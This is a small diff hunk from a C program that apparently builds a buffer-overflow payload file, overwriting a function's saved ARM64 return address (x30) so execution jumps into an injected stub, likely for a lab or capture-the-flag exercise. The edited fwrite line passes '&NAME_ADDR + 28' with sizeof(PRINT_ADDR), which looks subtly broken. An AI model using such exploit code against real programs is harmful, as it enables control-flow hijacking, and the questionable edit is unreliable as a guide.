@@ -61,7 +61,7 @@ int main(void)
 
     /* 3) Overwrite readString’s saved x30 with NAME_ADDR
         so that when readString does `ret`, it jumps into our stub. */
-    fwrite(&PRINT_ADDR, sizeof(PRINT_ADDR), 1, f);
+    fwrite(&NAME_ADDR + 28, sizeof(PRINT_ADDR), 1, f);
 
     fclose(f);
     return 0;
